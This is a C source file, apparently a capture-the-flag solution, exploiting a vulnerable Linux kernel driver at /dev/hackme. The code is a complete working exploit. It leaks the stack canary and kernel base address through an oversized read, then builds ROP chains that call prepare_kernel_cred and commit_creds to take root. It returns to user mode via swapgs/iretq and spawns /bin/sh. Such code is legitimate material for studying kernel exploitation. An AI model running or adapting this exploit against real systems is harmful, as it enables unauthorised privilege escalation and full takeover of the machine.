/*
 * author: @meowmeowxw
 *
 * ctf team: https://ctftime.org/team/117852
 */
#include <fcntl.h>
#include <locale.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <wchar.h>


#define PATH "/dev/hackme"
#define MAX_SIZE 0x198

typedef unsigned char uchar;

// Prototypes
void print_content(uint64_t ptr[], int size);
void save_status();
void leak_address(uint64_t offset);
void call_function(uint64_t function, uint64_t argument);
void get_rax();
uint64_t rebase(uint64_t offset);

// Gadgets
//
uint64_t commit_creds = 0x0,
         prepare_kernel_cred = 0x0,
         ksymtab_prepare_kernel_cred = 0xf8d4fc,
         ksymtab_commits_cred = 0xf87d90,
         pop_rdi_ret = 0x6370,               // pop rdi; ret;
         pop_rax = 0x4d11,                   // pop rax; ret;
         mov_eax_rax_pop_rbp = 0x4aae,
         swapgs_pop_regs_iretq = 0x200f23;   // pop 5 regs; swapgs; iretq;

         // Global variables
 uint64_t leak[MAX_SIZE], rop[MAX_SIZE], base_address = 0, mmap_addr, canary, ret; 
 uint64_t rax;
 size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
 int fd, r_bytes, i;
 const char cat[] = {0xf0, 0x9f, 0x90, 0x88, '\0'};

int main(int argc, char **argv) {
    fd = open(PATH, O_RDWR);
    if (fd < 0) {
        perror("open()");
        exit(-1);
    }

    r_bytes = read(fd, leak, MAX_SIZE);
    if (r_bytes < MAX_SIZE) {
        perror("read()");
    }
    print_content(leak, MAX_SIZE);

    canary = leak[16];
    ret = leak[20];
    base_address = leak[38] - 0xa157;
    printf("\n------------------------------  leak  ----------------------------\n\n");
    printf("[*] canary:           %#016lx\n", canary);
    printf("[*] ret address:      %#016lx\n", ret);
    printf("[*] base address:     %#016lx\n", base_address);

    printf("[!] time to rop\n\n");

    leak_address(rebase(ksymtab_commits_cred));
    // write(fd, rop, MAX_SIZE);
    printf("[!] rax: %#016lx\n", rax);
    commit_creds = rebase(ksymtab_commits_cred) + (int)rax;
    printf("[*] commit_creds: %#016lx\n\n", commit_creds);


    leak_address(rebase(ksymtab_prepare_kernel_cred));
    // write(fd, rop, MAX_SIZE);
    printf("[!] rax: %#016lx\n", rax);
    prepare_kernel_cred = rebase(ksymtab_prepare_kernel_cred) + (int)rax;
    printf("[*] prepare_kernel_cred: %#016lx\n\n", prepare_kernel_cred);


    call_function(prepare_kernel_cred, 0);
    printf("[!] rax: %#016lx\n", rax);
    printf("[*] kernel_cred: %#016lx\n\n", rax);

    call_function(commit_creds, rax);
    printf("[#] spawn shell %s %s %s %s\n", cat, cat, cat, cat);
    system("/bin/sh");

    return 0;
}

uint64_t rebase(uint64_t offset) {
    return offset + base_address;
}

void call_function(uint64_t function, uint64_t argument) {
    save_status();

    user_rip = (uint64_t)get_rax;
    memset(rop, 0, MAX_SIZE * sizeof(uint64_t));
    for (i = 0; i < 16; i++) {
        rop[i] = 0xdeadbeefdeadbeef;
    }
    // index 16 goes canary
    rop[i++] = canary;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    // index 20 goes first gadget
    rop[i++] = rebase(pop_rdi_ret);
    rop[i++] = argument;
    rop[i++] = function;
    rop[i++] = rebase(swapgs_pop_regs_iretq);
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = user_rip;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp + 8; // Adjust stack to return to main
    rop[i++] = user_ss;

    write(fd, rop, MAX_SIZE);
}

void leak_address(uint64_t offset) {
    save_status();

    user_rip = (uint64_t)get_rax;
    memset(rop, 0, MAX_SIZE * sizeof(uint64_t));
    for (i = 0; i < 16; i++) {
        rop[i] = 0xdeadbeefdeadbeef;
    }
    // index 16 goes canary
    rop[i++] = canary;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    rop[i++] = 0xdeadbeefdeadbeef;
    // index 20 goes first gadget
    rop[i++] = rebase(pop_rax);
    rop[i++] = offset - 0x10;
    rop[i++] = rebase(mov_eax_rax_pop_rbp);
    rop[i++] = user_sp;
    rop[i++] = rebase(swapgs_pop_regs_iretq);
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = 0xdeadbeefdeadbeef;              // rbp
    rop[i++] = user_rip;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp + 8; // Adjust stack to return to main
    rop[i++] = user_ss;

    write(fd, rop, MAX_SIZE);
}

void get_rax() {
    asm volatile (
            "mov %%rax, %0\n\t"
            : "=r"(rax)
            :
            : "rax"
            );
}

void save_status() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %3;\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
            :
            : "memory");
}

void print_content(uint64_t ptr[], int size) {
    for (int i = 0; i < size / 8; i++) {
        printf("0x%016lx\t", ptr[i]);
        if (!((i + 1) % 3)) {
            printf("\n");
        } 
    }

}

